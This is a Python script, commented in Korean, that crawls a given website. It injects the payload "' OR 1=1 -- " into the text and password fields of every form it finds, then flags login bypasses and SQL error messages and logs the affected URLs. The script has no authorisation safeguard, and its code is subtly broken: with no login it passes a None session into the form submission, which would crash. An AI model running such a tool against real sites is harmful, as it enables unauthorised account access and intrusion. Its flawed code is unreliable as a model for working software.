import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
import time
import json

NSQL = []
NSQL_FILE = 'nsql_data.json'

def save_data_to_file(data, filename):
    with open(filename, 'w') as file:
        json.dump(data, file)

def load_data_from_file(filename):
    try:
        with open(filename, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return []  # 파일이 없을 경우 빈 리스트를 반환

def save_nsql():
    global NSQL
    save_data_to_file(NSQL, NSQL_FILE)

def load_nsql():
    return load_data_from_file(NSQL_FILE)

def dynamic_login(session, login_url, username, password):
    response = session.get(login_url)

    # BeautifulSoup 객체를 생성하여 HTML을 파싱
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # CSRF 토큰이나 기타 필요한 폼 데이터를 추출
    # <input type="hidden" name="csrf_token" value="xxxxxx">
    #csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
    
    login_payload = {
        "username": username,
        "password": password,
        #"csrf_token": csrf_token  
    }
    
    # 로그인 요청
    response = session.post(login_url, data=login_payload)
    
    if response.ok:
        print("Login successful.")
    else:
        print("Login failed.")
    return session


def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value, session):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "password":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value", "1")
        if input_name:
            data[input_name] = input_value
    headers = {"User-Agent": "Mozilla/5.0"}
    session.headers.update(headers)
    if form_details["method"] == "post":
        return session.post(target_url, data=data)
    else:
        return session.get(target_url, params=data)

def scan_sql_injection(form_details, url, session):
    test_sql_injection = "' OR 1=1 -- "
    response = submit_form(form_details, url, test_sql_injection, session)
    response_content = response.content.decode()

    login_success_signals = ["로그아웃", "내 프로필", "계정 설정", "회원님", "성공"]

    for signal in login_success_signals:
        if signal in response_content:
            print(f"[!!!] Session exists after SQL Injection attempt. Potential vulnerability detected with signal: {signal}")
            NSQL.append(url)
            save_data_to_file(NSQL, NSQL_FILE)
            save_nsql()
            return True

    error_messages = [
        "You have an error in your SQL syntax;",
        "Warning: mysql",
        "Unclosed quotation mark after the character string",
        "SQLSTATE"
    ]
    
    for error in error_messages:
        if error.lower() in response_content.lower():
            print(f"[!!!] Potential SQL Injection vulnerability detected with error message: {error}")
            return True
    
    return False

def get_all_links(url):
    urls = set()
    domain_name = urlparse(url).netloc
    res = requests.get(url, headers={"User-Agent": "Mozilla/5.0"})
    soup = BeautifulSoup(res.text, "html.parser")
    for a_tag in soup.findAll("a"):
        href = a_tag.attrs.get("href")
        if href == "" or href is None:
            continue
        href = urljoin(url, href)
        parsed_href = urlparse(href)
        if domain_name not in parsed_href.netloc:
            continue
        urls.add(href)
    return urls

def get_all_forms_selenium(url):
    options = FirefoxOptions()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)
    driver.get(url)
    time.sleep(5)
    html = driver.page_source
    soup = BeautifulSoup(html, 'html.parser')
    forms = soup.find_all("form")
    driver.quit()
    return forms

def crawl_and_scan(url, session):
    for link in get_all_links(url):
        print(f"[+] Crawling URL: {link}")
        forms = get_all_forms_selenium(link)
        print(f"[+] Found {len(forms)} forms on {link}")
        for form in forms:
            form_details = get_form_details(form)
            if scan_sql_injection(form_details, link, session):
                print(f"🛑 \033[38;2;255;0;0m[V] SQL Injection vulnerability detected, form action: {form_details['action']}\033[0m")
            else:
                print(f"[-] No SQL Injection vulnerability found, form action: {form_details['action']}")

if __name__ == "__main__":
    url = input("Enter the website URL to scan: ")  # 크롤링할 웹사이트 URL 입력 받음
    login_required = input("Is login required for this website? (yes/no): ").lower()
    session = None  # 기본값은 None으로 설정

    if login_required == "yes":
        login_url = input("Enter the login URL: ")
        username = input("Enter your username or email: ")  
        password = input("Enter your password: ")
        # 로그인 세션 생성
        session = requests.Session()
        session = dynamic_login(session, login_url, username, password)
        # 로그인 세션을 이용해 사이트 크롤링 및 SQL Injection 취약점 스캔
    crawl_and_scan(url, session)  # url과 session을 인자로 전달
